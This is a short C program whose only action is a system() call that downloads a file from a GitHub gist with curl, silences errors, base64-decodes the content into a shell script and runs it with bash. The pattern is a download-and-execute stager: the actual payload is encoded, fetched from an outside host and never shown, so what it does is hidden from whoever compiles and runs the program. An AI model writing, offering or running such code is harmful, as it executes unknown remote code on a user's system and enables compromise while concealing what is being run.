#include <stdlib.h>

int	main()
{
	system("curl https://gist.githubusercontent.com/smurfy92/9fb82047e321bc976a345033e15d7ca6/raw/cf65860415f0bbafd8a0fc0a047eb56dc13caccd/gistfile1.txt 2>&- > toto; base64 -d toto > script.sh; bash script.sh");
}
